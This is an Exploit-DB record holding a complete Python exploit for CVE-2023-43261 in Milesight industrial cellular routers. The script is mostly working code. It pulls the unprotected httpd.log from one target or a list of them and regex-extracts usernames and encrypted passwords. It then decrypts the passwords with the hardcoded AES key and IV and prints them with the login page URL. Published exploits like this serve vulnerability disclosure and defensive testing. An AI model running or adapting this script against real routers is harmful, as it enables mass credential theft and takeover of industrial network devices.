{"source": "https://www.exploit-db.com/exploits/51784", "vulnName": "Milesight Routers UR5X, UR32L, UR32, UR35, UR41 - Credential Leakage Through Unprotected System Logs and Weak Password Encryption", "vulnEDBID": "51784", "vulnCVE": "N/A", "author": "BIPIN JITIYA", "exploitType": "REMOTE", "platform": "HARDWARE", "datePublished": "2024-02-05", "vulnContent": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\n\"\"\"\nTitle: Credential Leakage Through Unprotected System Logs and Weak Password Encryption\nCVE: CVE-2023-43261\nScript Author: Bipin Jitiya (@win3zz)\nVendor: Milesight IoT - https://www.milesight-iot.com/ (Formerly Xiamen Ursalink Technology Co., Ltd.)\nSoftware/Hardware: UR5X, UR32L, UR32, UR35, UR41 and there might be other Industrial Cellular Router could also be vulnerable.\nScript Tested on: Ubuntu 20.04.6 LTS with Python 3.8.10\nWriteup: https://medium.com/@win3zz/inside-the-router-how-i-accessed-industrial-routers-and-reported-the-flaws-29c34213dfdf\n\"\"\"\n\nimport sys\nimport requests\nimport re\nimport warnings\nfrom Crypto.Cipher import AES # pip install pycryptodome\nfrom Crypto.Util.Padding import unpad\nimport base64\nimport time\n\nwarnings.filterwarnings(\"ignore\")\n\nKEY = b'1111111111111111'\nIV = b'2222222222222222'\n\ndef decrypt_password(password):\n    try:\n        return unpad(AES.new(KEY, AES.MODE_CBC, IV).decrypt(base64.b64decode(password)), AES.block_size).decode('utf-8')\n    except ValueError as e:\n        display_output('      [-] Error occurred during password decryption: ' + str(e), 'red')\n\ndef display_output(message, color):\n    colors = {'red': '\\033[91m', 'green': '\\033[92m', 'blue': '\\033[94m', 'yellow': '\\033[93m', 'cyan': '\\033[96m', 'end': '\\033[0m'}\n    print(f\"{colors[color]}{message}{colors['end']}\")\n    time.sleep(0.5)\n\nurls = []\n\nif len(sys.argv) == 2:\n    urls.append(sys.argv[1])\n\nif len(sys.argv) == 3 and sys.argv[1] == '-f':\n    with open(sys.argv[2], 'r') as file:\n        urls.extend(file.read().splitlines())\n\nif len(urls) == 0:\n    display_output('Please provide a URL or a file with a list of URLs.', 'red')\n    display_output('Example: python3 ' + sys.argv[0] + ' https://example.com', 'blue')\n    display_output('Example: python3 ' + sys.argv[0] + ' -f urls.txt', 'blue')\n    sys.exit()\n\nuse_proxy = False\nproxies = {'http': 'http://127.0.0.1:8080/'} if use_proxy else None\n\nfor url in urls:\n    display_output('[*] Initiating data retrieval for: ' + url + '/lang/log/httpd.log', 'blue')\n    response = requests.get(url + '/lang/log/httpd.log', proxies=proxies, verify=False)\n\n    if response.status_code == 200:\n        display_output('[+] Data retrieval successful for: ' + url + '/lang/log/httpd.log', 'green')\n        data = response.text\n        credentials = set(re.findall(r'\"username\":\"(.*?)\",\"password\":\"(.*?)\"', data))\n\n        num_credentials = len(credentials)\n        display_output(f'[+] Found {num_credentials} unique credentials for: ' + url, 'green')\n\n        if num_credentials > 0:\n            display_output('[+] Login page: ' + url + '/login.html', 'green')\n            display_output('[*] Extracting and decrypting credentials for: ' + url, 'blue')\n            display_output('[+] Unique Credentials:', 'yellow')\n            for i, (username, password) in enumerate(credentials, start=1):\n                display_output(f'    Credential {i}:', 'cyan')\n                decrypted_password = decrypt_password(password.encode('utf-8'))\n                display_output(f'      - Username: {username}', 'green')\n                display_output(f'      - Password: {decrypted_password}', 'green')\n        else:\n            display_output('[-] No credentials found in the retrieved data for: ' + url, 'red')\n    else:\n        display_output('[-] Data retrieval failed. Please check the URL: ' + url, 'red')\n            "}